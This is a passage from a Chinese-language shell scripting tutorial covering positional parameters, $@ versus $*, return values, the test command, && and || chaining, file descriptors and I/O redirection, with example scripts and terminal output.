title="shell十五问之9：$@与$*差在哪？"></a>shell十五问之9：$@与$*差在哪？</h2><hr><p>要说<code>$@</code>与<code>$*</code>之前，需得先从shell script的positional parameter谈起。</p><p>我们都已经知道变量(variable)是如何定义和替换的，这个不再多讲了。</p><h3 id="1-shell-script的positional-parameter"><a href="#1-shell-script的positional-parameter" class="headerlink" title="1. shell script的positional parameter"></a>1. shell script的positional parameter</h3><p>但是，我们还需要知道有些变量是shell内定的，且其名称是我们不能随意修改的。<br>其中，就有positional parameter在内。</p><p>在shell script中，我们可用$0, $1, $2, $3 …<br>这样的变量分别提取命令行中的如下部分:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script_name parameter1 parameter2 parameter3 ...</span><br></pre></td></tr></table></figure></p><p>我们很容易就能猜出, <code>$0</code>就是代表 shell script名称(路径)本身，而<code>$1</code>就是其后的第一个参数，如此类推…</p><p>须得留意的是<code>IFS</code>的作用, 也就是<code>IFS</code>被quoting处理后，那么positional parameter也会改变。</p><p>如下例：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my.sh p1 "p2 p3" p4</span><br></pre></td></tr></table></figure></p><p>由于p2与p3之间的空白键被soft quoting所关闭了，因此，my.sh的中$2是”p2 p3”,而$3则是p4…</p><p>还记得前两章，我们提到function时，我们不是说过，它是script中的script吗？^_^</p><p>是的，function一样可以读取自己的(有别于script的)positional parameter, 唯一例外的是<code>$0</code>而已。</p><p>举例而言：<br>假设my.sh里有一个函数(function)叫my_fun,若在script中跑<code>my_fun fp1 fp2 fp3</code>,那么，function内的$0就是my.sh，而$1是fp1而不是p1了。</p><p>不如写个简单的my.sh script 看看吧：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">my_fun() &#123;</span><br><span class="line">    echo '$0 inside function is '$0</span><br><span class="line">trueecho '$1 inside function is '$1</span><br><span class="line">trueecho '$2 inside function is '$2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo '$0 outside function is '$0</span><br><span class="line">echo '$1 outside function is '$1</span><br><span class="line">echo '$2 outside function is '$2</span><br><span class="line"></span><br><span class="line">my_fun fp1 "fp2 fp3"</span><br></pre></td></tr></table></figure></p><p>然后在command line中跑一下 script就知道了：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> chmod 755 my.sh</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./my.sh p1 <span class="string">"p2 p3"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">0 outside <span class="keyword">function</span> is ./my.sh</span></span><br><span class="line"><span class="meta">$</span><span class="bash">1 outside <span class="keyword">function</span> is p1</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2 outside <span class="keyword">function</span> is p2 p3</span></span><br><span class="line"><span class="meta">$</span><span class="bash">0 inside <span class="keyword">function</span> is ./my.sh</span></span><br><span class="line"><span class="meta">$</span><span class="bash">1 inside <span class="keyword">function</span> is fp1</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2 inside <span class="keyword">function</span> is fp2 fp3</span></span><br></pre></td></tr></table></figure></p><p>然而，在使用positional parameter的时候，我们要注意一些陷阱哦：</p><p><code>$10</code>不是替换第10个参数，而是替换第一个参数，然后在补一个0于其后;</p><p>也就是说， <code>my.sh one two three four five six seven eight nine ten</code>这样的command line, <code>my.sh</code>里的<code>$10</code>不是ten而是<code>one</code>（<code>1</code>）<code>0</code>哦。小心小心要抓到ten的话，有两种方法：</p><ul><li>方法一：使用我们上一章介绍的<code>${}</code>, 也就是用<code>${10}</code>即可。</li><li>方法二：就是shift了。</li></ul><p>用通俗的说法来说，<strong>所谓的shift就是取消positional parameter中最左边的参数(<code>$0</code>不受影响)</strong>。<br>其预设值为1，也就是shift 或shift 1 都是取消<code>$1</code>,而原本的<code>$2</code>则变成<code>$1</code>, <code>$3</code>则变成<code>$2</code>。<br>那亲爱的读者，你说要shift掉多少个参数，才可用<code>$1</code>取得到<code>${10}</code> 呢？ ^_^</p><p>ok，当我们对positional parameter有了基本的概念之后，那再让我们看看其他相关变量吧。</p><h3 id="2-shell-script的positional-parameter的number"><a href="#2-shell-script的positional-parameter的number" class="headerlink" title="2. shell script的positional parameter的number"></a>2. shell script的positional parameter的number</h3><p>先是<code>$#</code>, 它可抓出positional parameter的数量。<br>以前面的<code>my.sh p1 &quot;p2 p3&quot;</code>为例：<br>由于”p2 p3”之间的<code>IFS</code>是在soft quote中，因此，<code>$#</code>就可得到的值是2。但如果p2与p3没有置于quoting中话，那<code>$#</code>就可得到3的值了。<br>同样的规则，在function中也是一样。</p><p>因此，我们常在shell script里用如下方法，测试script是否有读进参数：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ $# = 0 ]</span><br></pre></td></tr></table></figure></p><p>假如为<code>0</code>, 那就表示script没有参数，否则就是带有参数。</p><h3 id="3-shell-script中的-与"><a href="#3-shell-script中的-与" class="headerlink" title="3. shell script中的$@与$*"></a>3. shell script中的$@与$*</h3><p>接下来就是<code>$@</code>与<code>$*</code>:<br>精确来讲，两者只有在soft quote中才有差异，否则，都表示全部参数 (<code>$0</code>除外)。</p><p>若在comamnd line上， 跑<code>my.sh p1 &quot;p2 p3&quot; p4</code>的话，不管<code>$@</code>还是<code>$\*</code>, 都可得到 p1 p2 p3 p4就是了。</p><p>但是，如果置于soft quote中的话：</p><ul><li>“$@”则可得到 “p1” “p2 p3” “p4” 这三个不同字段(word);</li><li>“$*”则可得到 “p1 p2 p3 p4” 这一整个单一的字段。</li></ul><p>我们修改一下前面的my.sh，使之内容如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">my_fun</span></span>() &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"<span class="variable">$#</span>"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'the number of parameter in "$@" is '</span> $(my_fun <span class="string">"<span class="variable">$@</span>"</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'the number of parameter in "$*" is '</span> $(my_fun <span class="string">"$*"</span>)</span><br></pre></td></tr></table></figure></p><p>然后再执行:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./my.sh p1 <span class="string">"p2 p3"</span> p4</span></span><br></pre></td></tr></table></figure></p><p>就知道，$@与$*差在哪了。</p><h2 id="shell十五问之10：-amp-amp-与-差在哪？"><a href="#shell十五问之10：-amp-amp-与-差在哪？" class="headerlink" title="shell十五问之10：&amp;&amp; 与 || 差在哪？"></a>shell十五问之10：&amp;&amp; 与 || 差在哪？</h2><hr><p>好不容易，进入了两位数的章节了。<br>一路走来，很辛苦吧？也很快乐吧？ ^_^</p><p>在解答本章题目之前，先让我们了解一个概念：</p><blockquote><p>return value。我们在shell下跑的每一个command或function，在结束的时候都会传回父进程一个值，称为 <code>return value</code>。</p></blockquote><p>在shell command line中可用<code>$?</code>，这个变量得到最新的一个<code>return value</code>，也就是刚刚结束的那个进程传回的值。</p><p><code>Return Value</code>(RV)的取值为0-255之间，由进程或者script的作者自行定义：</p><ul><li><p>若在script里，用exit RV 来指定其值;若没有指定, 在结束时，以最后一个命令的RV，为script的RV值。</p></li><li><p>若在function里，则用return RV 来代替exit RV即可。</p></li></ul><p><code>Return Value</code>的作用：用来判断进程的退出状态(exit status)。</p><p>进程的退出状态有两种：</p><ul><li>0值为”真”(true)</li><li>非0值为”假”(false)</li></ul><p>举个例子来说明好了：<br>假设当前目录内有一个my.file的文件， 而no.file是不存在的：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> touch my.file</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls my.file</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> $? <span class="comment">#first echo</span></span></span><br><span class="line">0</span><br><span class="line"><span class="meta">$</span><span class="bash"> ls no.file</span></span><br><span class="line">ls: no.file: No such file or directory</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> $?     <span class="comment">#second echo</span></span></span><br><span class="line">1</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> $?     <span class="comment">#third echo</span></span></span><br><span class="line">0</span><br></pre></td></tr></table></figure></p><p>上例的：</p><ul><li>第一个echo是关于<code>ls my.file</code>的RV，可得到0的值，因此为true。</li><li>第二个echo是关于<code>ls no.file</code>的RV，得到非0的值，因此为false。</li><li>第三个echo是关于<code>echo $?</code>的RV，得到0值， 因此为true。</li></ul><p>请记住：<br>每一个command在结束时，都会返回<code>return value</code>，不管你跑什么命令。<br>然而，有一个命令却是专门用来测试某一条而返回<code>return value</code>，以供true或false的判断， 它就是<code>test</code>命令。</p><p>若你用的是bash， 请在command line下，打<code>man test</code>，或者 <code>man bash</code> 来了解这个<code>test</code>的用法。<br>这是你可用作参考的最精准的文件了，别人说的，仅作参考就好。</p><p>下面，我只简单作一些辅助说明，其余的一律以 <code>man</code>为准：<br>首先，<code>test</code>的表达式，我们称为expression，其命令格式有两种：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test expression</span><br></pre></td></tr></table></figure></p><p>或者<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ expression ]</span><br></pre></td></tr></table></figure></p><blockquote><p><strong>Note:</strong></p></blockquote><blockquote><p>请务必注意 <code>[]</code> 之间的空白键!</p></blockquote><p>用哪一种格式无所谓，都是一样的效果。<br>(我个人比较喜欢后者…)</p><p>其次，bash的<code>test</code>目前支持的测试对象只有三种：</p><ul><li>string：字符串，也就是纯文字。</li><li>integer：整数(0或正整数、不含负数或小数)</li><li>file：文件</li></ul><p>请初学者，一定要搞清楚这三者的差异，因为<code>test</code>所使用的expression是不一样的。</p><p>以A=123这个变量为例：</p><ul><li><p><code>[ &quot;$A&quot; = 123 ]</code> #是字符串测试，测试$A是不是1、2、3这三个字符。</p></li><li><p><code>[ &quot;$A&quot; -eq 123 ]</code> #是整数测试，以测试$A是否等于123。</p></li><li><p><code>[ -e &quot;$A&quot; ]</code> #文件测试，测试123这份文件是否存在。</p></li></ul><p>第三，<br>当expression测试为“真”时， <code>test</code>就返回0(true)的<code>return value</code>;<br>否则，返回非0(false)。</p><p>若在 expression 之前加一个<code>!</code>(感叹号)，则在expression为假时，return value为<code>0</code>,否则, return value 为非<code>0</code>值。</p><p>同时，<code>test</code>也允许多重复合测试：</p><ul><li>expression1 -a expression2 #当两个expression都为true，返回<code>0</code>，否则，返回非<code>0</code>；</li><li>expression1 -o expression2 #当两个expression均为false时，返回非<code>0</code>，否则，返回<code>0</code>；</li></ul><p>例如：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ -d "$file"  -a  -x "$file" ]</span><br></pre></td></tr></table></figure></p><p>表示当<code>$file</code>是一个目录，且同时具有<code>x</code>权限时，<code>test</code>才会为true。</p><p>第四，在command line中使用<code>test</code>时，请别忘记命令行的“重组”特性，也就是在碰到meta时，会先处理meta，在重新组建命令行。<br>(这个概念在第2章和第4章进行了反复强调)</p><p>比方说， 若<code>test</code>碰到变量或者命令替换时，若不能满足expression的格式时，将会得到语法错误的结果。</p><p>举例来说好了：</p><p>关于<code>[ string1 = string2 ]</code>这个test格式，在等号两边必须要有字符串，其中包括空串(null串,可用soft quote或者hard quote取得)。</p><p>假如$A目前没有定义，或被定义为空字符串的话，那如下的用法将会失败：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">unset</span> A</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> [ <span class="variable">$A</span> = abc ]</span></span><br><span class="line">[: =: unary oprator expected</span><br></pre></td></tr></table></figure></p><p>这是因为命令行碰到<code>$</code>这个meta时，会替换<code>$A</code>的值，然后，再重组命令行，那就变成了<code>[ = abc ]</code>, 如此一来，<code>=</code>的左边就没有字符串存在了，因此，造成test的语法错误。<br>但是，下面这个写法则是成立的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> [ <span class="string">"<span class="variable">$A</span>"</span> = abc ]</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> $?</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>这是因为命令行重组后的结果为：<br><code>[ &quot;&quot; = abc ]</code>,<br>由于等号的左边我们用soft quote得到一个空串，而让test的语法得以通过。</p><p>读者诸君，请务必留意这些细节哦，因为稍一不慎，将会导致test的结果变了个样。<br>若您对test还不是很有经验的话，那在使用test时，不妨先采用如下这一个法则:</p><blockquote><p>若在<code>test</code>中碰到变量替换，用soft quote是最保险的。</p></blockquote><p>若你对quoting不熟的话，请重新温习第四章的内容吧…^<em>^<br>ok, 关于更多的<code>test</code>的用法，老话一句：请看其man page (<code>man test</code>)吧！^</em>^<br>虽然洋洋洒洒读了一大堆，或许你还在嘀咕…那…那个<code>return value</code>有啥用？</p><p>问得好:<br>告诉你：return value的作用可大了，若你想要你的shell变聪明的话，就全靠它了：<br>有了return value，我们可以让shell根据不同的状态做不同的事情。<br>这时候，才让我来揭晓本章的答案吧^_^</p><p><code>&amp;&amp;</code> 与 <code>||</code> 都是用来组建多个command line用的；</p><ul><li><code>command1 &amp;&amp; command2</code> # command2只有在command1的RV为0(true)的条件下执行。</li><li><code>command1 || command2</code> # command2 只有在command1的RV为非0(false)的条件下执行。</li></ul><p>以例子来说好了：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> A=123</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> [ -n <span class="string">"<span class="variable">$A</span>"</span> ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"yes! it's true."</span></span></span><br><span class="line">yes! it's true.</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">unset</span> A</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> [ -n <span class="string">"<span class="variable">$A</span>"</span> ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"yes! it's true."</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> [ -n <span class="string">"<span class="variable">$A</span>"</span> ] || <span class="built_in">echo</span> <span class="string">"no, it's Not true."</span></span></span><br><span class="line">no, it's Not true</span><br></pre></td></tr></table></figure></p><blockquote><p><strong>Note:</strong></p></blockquote><blockquote><p><code>[ -n string ]</code>是测试string长度大于0, 则为true。</p></blockquote><p>上例中，第一个<code>&amp;&amp;</code>命令之所以会执行其右边的<code>echo</code>命令，是因为上一个<code>test</code>返回了0的RV值；<br>但第二个，就不会执行，因为<code>test</code>返回了非0的结果。<br>同理，<code>||</code>右边的<code>echo</code>会被执行，却正是因为左边的<code>test</code>返回非0所引起的。</p><p>事实上，我们在同一个命令行中，可用多个<code>&amp;&amp;</code> 或 <code>||</code> 来组建呢。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> A=123</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> [ -n <span class="string">"<span class="variable">$A</span>"</span> ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"yes! it's true."</span> || <span class="built_in">echo</span> <span class="string">"no, it's Not ture."</span></span></span><br><span class="line">yes! it's true.</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">unset</span> A</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> [ -n <span class="string">"<span class="variable">$A</span>"</span> ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"yes! it's true."</span> || <span class="built_in">echo</span> <span class="string">"no, it's Not ture."</span></span></span><br><span class="line">no, it's Not true</span><br></pre></td></tr></table></figure></p><p>怎样，从这一刻开始，你是否觉得我们的shell是“很聪明”的呢？ ^_^</p><p>好了，最后布置一道练习题给大家做做看：<br>下面的判断是：当$A被赋值时，在看看其是否小于100，否则输出too big！<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> A=123</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> [ -n <span class="string">"<span class="variable">$A</span>"</span> ] &amp;&amp; [ <span class="string">"<span class="variable">$A</span>"</span> -lt 100 ] || <span class="built_in">echo</span> <span class="string">'too big!'</span></span></span><br><span class="line">too big!</span><br></pre></td></tr></table></figure></p><p>若我取消A，照理说，应该不会输出文字啊，(因为第一个条件不成立)。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">unset</span> A</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> [ -n <span class="string">"<span class="variable">$A</span>"</span> ] &amp;&amp; [ <span class="string">"<span class="variable">$A</span>"</span> -lt 100 ] || <span class="built_in">echo</span> <span class="string">'too big!'</span></span></span><br><span class="line">too big!</span><br></pre></td></tr></table></figure></p><p>为何上面的结果也可得到呢？输出了too big？又如何解决呢？</p><blockquote><p><strong>Tips:</strong></p></blockquote><blockquote><p>修改的方法有很多种，<br>其中一种方法可以利用第7章中介绍过 <code>command group</code>。</p></blockquote><p>快告诉我答案，其余免谈。</p><p>解决方法1：<code>sub-shell</code>：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">unset</span> A</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> [ -n <span class="string">"<span class="variable">$A</span>"</span> ] &amp;&amp; ( [ <span class="string">"<span class="variable">$A</span>"</span> -lt 100 ] || <span class="built_in">echo</span> <span class="string">'too big!'</span> )</span></span><br></pre></td></tr></table></figure></p><p>解决方法二：<code>command group</code>:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">unset</span> A</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> [ -n <span class="string">"<span class="variable">$A</span>"</span> ] &amp;&amp; &#123; [ <span class="string">"<span class="variable">$A</span>"</span> -lt 100 ] || <span class="built_in">echo</span> <span class="string">'too big!'</span>; &#125;</span></span><br></pre></td></tr></table></figure></p><h2 id="shell十五问之11：-gt-与-lt-差在哪？"><a href="#shell十五问之11：-gt-与-lt-差在哪？" class="headerlink" title="shell十五问之11：&gt;与&lt; 差在哪？"></a>shell十五问之11：&gt;与&lt; 差在哪？</h2><hr><h3 id="1-文件描述符-fd-File-Descriptor"><a href="#1-文件描述符-fd-File-Descriptor" class="headerlink" title="1. 文件描述符(fd, File Descriptor)"></a>1. 文件描述符(fd, File Descriptor)</h3><p>谈到<code>I/O redirection</code>,不妨先让我们认识一下<code>File Descriptor</code>(<code>fd</code>，文件描述符)。</p><p>进程的运算，在大部分情况下，都是进行数据(data)的处理，这些数据从哪里，读进来？又输出到哪里呢？<br>这就是file descriptor(fd)的功用了。</p><p>在shell的进程中，最常使用的<code>fd</code>大概有三个，分别为:</p><ul><li>0：standard Input (<code>STDIN</code>) </li><li>1: standard output(<code>STDOUT</code>)</li><li>2: standard Error output （<code>STDERR</code>）</li></ul><p>在标准情况下，这些fd分别跟如下设备(device)关联：</p><ul><li><code>stdin</code>(0): keyboard</li><li><code>stdout</code>(1): monitor</li><li><code>stderr</code>(2): monitor</li></ul><blockquote><p><strong>Tips:</strong><br>linux中的文件描述符(fd)用整数表示。<br>linux中任何一个进程都默认打开三个文件,<br>这三个文件对应的文件描述符分别是：0, 1, 2;<br>即stdin, stdout, stderr.</p></blockquote><p>我们可以用如下命令测试一下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mail -s <span class="built_in">test</span> root</span></span><br><span class="line">this is a test mail。</span><br><span class="line">please skip.</span><br><span class="line">^d (同时按下ctrl 跟d键)</span><br></pre></td></tr></table></figure></p><p>很明显，<code>mail</code>进程所读进的数据，就是从<code>stdin</code> 也就是keyboard读进的。<br>不过，不见得每个进程的<code>stdin</code>都跟<code>mail</code>一样从<code>keyboard</code>读进，<br>因为进程的作者可以从文件参数读进<code>stdin</code>，如：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/passwd</span></span><br></pre></td></tr></table></figure></p><p>但，要是<code>cat</code>之后没有文件参数则如何呢？<br>哦， 请你自己玩玩看…^_^<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat</span></span><br></pre></td></tr></table></figure></p><blockquote><p><strong>Tips:</strong></p></blockquote><blockquote><p>请留意数据输出到哪里去了，<br>最后别忘了按<code>ctrl+d</code>(<code>^d</code>), 退出stdin输入。</p></blockquote><p>至于<code>stdout</code>与<code>stderr</code>，嗯…等我有空再续吧…^_^<br>还是，有哪位前辈来玩接龙呢？</p><p>相信，经过上一个练习后，你对<code>stdin</code>与<code>stdout</code>应该不难理解了吧？<br>然后，让我们看看<code>stderr</code>好了。</p><p>事实上，<code>stderr</code>没什么难理解的：<br>说白了就是“错误信息”要往哪里输出而已比方说, 若读进的文件参数不存在的，<br>那我们在monitor上就看到了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls no.such.file</span></span><br><span class="line">ls: no.such.file: No such file or directory</span><br></pre></td></tr></table></figure><p>若同一个命令，同时成生<code>stdout</code>与<code>stderr</code>呢？那还不简单，都送到monitor来就好了：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> touch my.file</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls my.file on.such.file</span></span><br><span class="line">ls: no.such.file: No such file or directory</span><br><span class="line">my.file</span><br></pre></td></tr></table></figure></p><p>okay, 至此，关于fd及其名称、还有相关联的设备，相信你已经没问题了吧？</p><h3 id="2-I-O-重定向-I-O-Redirection"><a href="#2-I-O-重定向-I-O-Redirection" class="headerlink" title="2. I/O 重定向(I/O Redirection)"></a>2. I/O 重定向(I/O Redirection)</h3><hr><p>那好，接下来让我们看看如何改变这些fd的预设数据通道。</p><ul><li>用<code>&lt;</code> 来改变读进的数据通道(stdin),使之从指定的文件读进。</li><li>用<code>&gt;</code> 来改变输出的数据通道(stdout，stderr),使之输出到指定的文件。</li></ul><hr><h4 id="2-1-输入重定向-n-lt-input-redirection"><a href="#2-1-输入重定向-n-lt-input-redirection" class="headerlink" title="2.1 输入重定向 n &lt; (input redirection)"></a>2.1 输入重定向 n &lt; (input redirection)</h4><hr><p>比方说：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat &lt; my.file</span></span><br></pre></td></tr></table></figure></p><p>就是从my.file读入数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mail -s <span class="built_in">test</span> root &lt; /etc/passwd</span></span><br></pre></td></tr></table></figure><p>则是从<code>/etc/passwd</code>读入，这样一来，stdin将不再是从keyboard读入，而是从指定的文件读入了。</p><p>严格来说，<code>&lt;</code>符号之前需要指定一个fd的(之前不能有空白)，但因为0是<code>&lt;</code>的预设值，因此，<code>&lt;</code>与<code>0&lt;</code>是一样的。</p><p>ok，这样好理解了吧？</p><p>那要是用两个<code>&lt;</code>，即<code>&lt;&lt;</code>又是啥呢？<br>这是所谓的<code>here document</code>, 它可以让我们输入一段文本，直到读到<code>&lt;&lt;</code> 后指定的字符串。</p><p>比方说：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat &lt;&lt;EOF</span></span><br><span class="line">first line here</span><br><span class="line">second line here</span><br><span class="line">third line here</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></p><p>这样的话, <code>cat</code>会读入3个句子，而无需从keyboard读进数据且要等到(ctrl+d, ^d)结束输入。</p><hr><h4 id="2-2-重定向输出-gt-n-output-redirection"><a href="#2-2-重定向输出-gt-n-output-redirection" class="headerlink" title="2.2 重定向输出 &gt; n (output redirection)"></a>2.2 重定向输出 &gt; n (output redirection)</h4><hr><p>当你搞懂了<code>0&lt;</code> 原来就是改变<code>stdin</code>的数据输入通道之后，相信要理解如下两个redirection就不难了：</p><ul><li><code>1&gt;</code> #改变stdout的输出通道；</li><li><code>2&gt;</code> #改变stderr的输出通道；</li></ul><p>两者都是将原来输出到monitor的数据，重定向输出到指定的文件了。</p><p>由于1是<code>&gt;</code>的预设值，因此，<code>1&gt;</code>与<code>&gt;</code>是相同的，都是改变<code>stdout</code>。</p><p>用上次的ls的例子说明一下好了:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls my.file no.such.file 1&gt;file.out</span></span><br><span class="line">ls: no.such.file: No such file or directory</span><br></pre></td></tr></table></figure></p><p>这样monitor的输出就只剩下<code>stderr</code>的输出了，因为<code>stdout</code>重定向输出到文件file.out去了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls my.file no.such.file 2&gt;file.err</span></span><br><span class="line">my.file</span><br></pre></td></tr></table></figure><p>这样monitor就只剩下了<code>stdout</code>, 因为<code>stderr</code>重定向输出到文件file.err了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls my.file no.such.file 1&gt;file.out 2&gt;file.err</span></span><br></pre></td></tr></table></figure><p>这样monitor就啥也没有了，因为<code>stdout</code>与<code>stderr</code>都重定向输出到文件了。</p><p>呵呵，看来要理解<code>&gt;</code>一点也不难啦是不？ 没骗你吧？ ^_^<br>不过有些地方还是要注意一下的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls my.file no.such.file 1&gt;file.both 